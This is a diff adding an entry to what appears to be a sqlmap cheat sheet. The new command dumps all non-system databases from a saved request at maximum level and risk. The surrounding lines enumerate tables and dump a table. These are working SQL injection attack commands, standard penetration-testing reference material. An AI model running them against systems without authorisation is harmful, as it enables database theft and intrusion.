@@ -47,3 +47,9 @@ sqlmap -u http://URL/?PARAM=1 -D DATABASE --tables
 ```sh
 sqlmap -u http://URL/?PARAM=1 -D DATABASE -T TABLE --dump
 ```
+
+## Specify level, risk, database, https
+
+```sh
+sqlmap -r sql.req --dump-all --exclude-sysdbs --batch --level 5 --risk 3 --dbms PostgreSQL --force-ssl -vv
+```
